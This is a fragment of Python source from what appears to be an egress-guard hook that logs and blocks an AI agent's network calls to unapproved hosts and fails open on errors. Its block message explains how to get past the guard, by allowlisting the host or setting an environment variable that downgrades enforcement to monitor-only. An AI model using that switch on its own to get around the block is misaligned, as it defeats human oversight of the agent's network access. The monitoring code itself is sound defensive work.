            root,
            policy,
            {
                "verdict": verdict,
                "tool": tool_name,
                "destinations": unapproved,
                "denied": denied,
                "invoker": invoker,
                # The command is recorded because a finding nobody can triage is
                # not evidence. The sink is .tmp/ (gitignored) for that reason.
                "command": command[:2000],
            },
        )

        enforcing = _on("ICDEV_EGRESS_GUARD_ENFORCE") or bool(policy.get("enforce"))
        if not enforcing or verdict != "egress":
            return None
        return (
            "BLOCKED: network egress to an unapproved destination "
            f"({', '.join(unapproved)}) via '{invoker}'. Add the host to "
            "agent_egress.allowed_hosts in args/agent_egress_policy.yaml if this "
            "is legitimate, or set ICDEV_EGRESS_GUARD_ENFORCE=0 to downgrade "
            "this check to monitor-only."
        )
    except Exception:  # noqa: BLE001 — see docstring: fails open
        return None
